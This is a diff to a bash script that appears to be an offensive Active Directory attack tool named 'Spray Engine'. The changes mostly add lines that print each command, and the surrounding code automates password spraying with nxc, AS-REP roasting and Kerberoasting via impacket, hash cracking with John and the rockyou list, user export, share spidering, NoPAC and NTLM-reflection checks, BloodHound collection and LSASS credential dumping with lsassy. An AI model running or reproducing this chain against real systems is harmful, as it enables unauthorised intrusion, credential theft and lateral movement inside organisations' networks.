@@ -32,7 +32,7 @@ mkdir -p "$OUTDIR" "$SPIDER_DIR"
 : > "$USER_EXPORT_OUT"
 
 echo -e "${PURPLE}====================================================${NC}"
-echo -e "${GREEN}[+] Spray Engine${NC}"
+echo -e "${GREEN}[+] Spray Engine Auth Paralel${NC}"
 echo -e "${PURPLE}====================================================${NC}"
 
 for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
@@ -82,6 +82,7 @@ get_domain() {
     done
 
     local domain="" hostname="" nxc_out
+    echo -e "${GRAY}[CMD] timeout 15s nxc smb \"$ip\" --no-progress${NC}"
     nxc_out=$(timeout 15s nxc smb "$ip" --no-progress 2>/dev/null)
     domain=$(echo "$nxc_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)
     hostname=$(echo "$nxc_out" | grep -oP '(?<=\(name:)[^)]+' | head -n1)
@@ -125,6 +126,7 @@ process_target_proto() {
     local max_spray=2
     
     while [ $attempt_spray -le $max_spray ]; do
+        echo -e "${GRAY}[CMD] timeout 45s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" $EXTRA --continue-on-success --no-progress${NC}"
         timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" $EXTRA --continue-on-success --no-progress > "$TMP_RES" 2>&1
         sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
         cat "$TMP_RES" >> "$RAW_OUT"
@@ -148,6 +150,7 @@ process_target_proto() {
         local attempt_dom=1
         EXTRA="" 
         while [ $attempt_dom -le $max_spray ]; do
+            echo -e "${GRAY}[CMD] timeout 45s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" -d \"$DOMAIN\" --continue-on-success --no-progress${NC}"
             timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" -d "$DOMAIN" --continue-on-success --no-progress > "$TMP_RES" 2>&1
             sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES" 
             cat "$TMP_RES" >> "$RAW_OUT"
@@ -209,10 +212,12 @@ process_target_proto() {
             if mkdir "$OUTDIR/lock_asrep_${DOMAIN}" 2>/dev/null; then
                 ASREP_HASH_FILE="$OUTDIR/asrep_${DOMAIN}.txt"
                 echo -e "${PURPLE}[EXEC] Running ASREP Roasting → $DOMAIN ($dc_ip)${NC}"
+                echo -e "${GRAY}[CMD] timeout 40s impacket-GetNPUsers \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -format hashcat -outputfile \"$ASREP_HASH_FILE\"${NC}"
                 timeout 40s impacket-GetNPUsers "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -format hashcat -outputfile "$ASREP_HASH_FILE" 2>&1 | tee "$OUTDIR/asrep_${DOMAIN}_raw.log"
                 
                 if [[ -s "$ASREP_HASH_FILE" ]]; then
                     echo -e "${RED}[!] ASREP hash found! Cracking with John...${NC}"
+                    echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$ASREP_HASH_FILE\"${NC}"
                     timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$ASREP_HASH_FILE" 
                     ASREP_RESULT=$(john --show "$ASREP_HASH_FILE" | grep -v "password cracked" | grep ":")
                     if [[ -n "$ASREP_RESULT" ]]; then
@@ -225,10 +230,12 @@ process_target_proto() {
             if mkdir "$OUTDIR/lock_kerb_${DOMAIN}" 2>/dev/null; then
                 KERB_HASH_FILE="$OUTDIR/kerberoast_${DOMAIN}.txt"
                 echo -e "${PURPLE}[EXEC] Running Kerberoasting → $DOMAIN ($dc_ip)${NC}"
+                echo -e "${GRAY}[CMD] timeout 40s impacket-GetUserSPNs \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -outputfile \"$KERB_HASH_FILE\"${NC}"
                 timeout 40s impacket-GetUserSPNs "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -outputfile "$KERB_HASH_FILE" 2>&1 | tee "$OUTDIR/kerberoast_${DOMAIN}_raw.log"
                 
                 if [[ -s "$KERB_HASH_FILE" ]]; then
                     echo -e "${RED}[!] Kerberoast hash found! Cracking with John...${NC}"
+                    echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$KERB_HASH_FILE\"${NC}"
                     timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$KERB_HASH_FILE" 
                     KERB_RESULT=$(john --show "$KERB_HASH_FILE" | grep -v "password cracked" | grep ":")
                     if [[ -n "$KERB_RESULT" ]]; then
@@ -257,6 +264,7 @@ process_target_proto() {
 
             if [[ "$DOMAIN" != "." ]] && mkdir "$OUTDIR/lock_userexp_${DOMAIN}" 2>/dev/null; then
                 echo -e "${YELLOW}[!] Exporting users via LDAP for domain $DOMAIN...${NC}"
+                echo -e "${GRAY}[CMD] timeout 40s nxc ldap \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
                 timeout 40s nxc ldap "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1
                 if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
                     cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
@@ -270,6 +278,7 @@ process_target_proto() {
         if [[ "$proto" == "smb" ]]; then
             if [[ "$DOMAIN" != "." ]] && mkdir "$OUTDIR/lock_userexp_${DOMAIN}" 2>/dev/null; then
                 echo -e "${YELLOW}[!] Exporting users via SMB for domain $DOMAIN...${NC}"
+                echo -e "${GRAY}[CMD] timeout 40s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
                 timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1
                 if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
                     cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
@@ -279,11 +288,14 @@ process_target_proto() {
             fi
 
             ABS_SPIDER=$(readlink -f "$SPIDER_DIR")
+            echo -e "${GRAY}[CMD] timeout 60s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M spider_plus ...${NC}"
             timeout 60s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" >/dev/null 2>&1
             
+            echo -e "${GRAY}[CMD] timeout 30s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M nopac${NC}"
             timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M nopac > "$TMP_RES" 2>&1
             grep -qi "VULNERABLE" "$TMP_RES" && { echo -e "${RED}[!] ALERT: Target VULNERABLE to NoPAC!${NC}"; echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NoPAC!" >> "$CLEAN_OUT"; }
 
+            echo -e "${GRAY}[CMD] timeout 30s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M ntlm_reflection${NC}"
             timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M ntlm_reflection > "$TMP_RES" 2>&1
             grep -qi "vulnerable" "$TMP_RES" && { echo -e "${RED}[!] ALERT: Target VULNERABLE to NTLM Reflection!${NC}"; echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NTLM Reflection!" >> "$CLEAN_OUT"; }
 
@@ -294,12 +306,14 @@ process_target_proto() {
                     echo -e "${YELLOW}[*] Ingesting AD data via BloodHound...${NC}"
                     (
                         cd "$BH_DIR" || exit
+                        echo -e "${GRAY}[CMD] timeout 150s bloodhound-python -d \"$DOMAIN\" -dc \"${DC_FQDN_MAP[$DOMAIN]}\" -u \"$user\" -p \"$pass\" -ns \"$dc_ip\" -c all${NC}"
                         timeout 150s bloodhound-python -d "$DOMAIN" -dc "${DC_FQDN_MAP[$DOMAIN]}" -u "$user" -p "$pass" -ns "$dc_ip" -c all >bloodhound_run.log 2>&1
                     )
                 fi
             fi
 
             if echo "$BEST_LINE" | grep -qi "Pwn3d!"; then
+                echo -e "${GRAY}[CMD] timeout 40s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $EXTRA $DOMAIN_ARG -M lsassy${NC}"
                 timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $EXTRA $DOMAIN_ARG -M lsassy > "$TMP_RES" 2>&1
                 if grep -qiE "dumped|success" "$TMP_RES"; then
                     echo "[$proto] $ip - [LSASS] Credentials successfully dumped via lsassy" >> "$CLEAN_OUT"
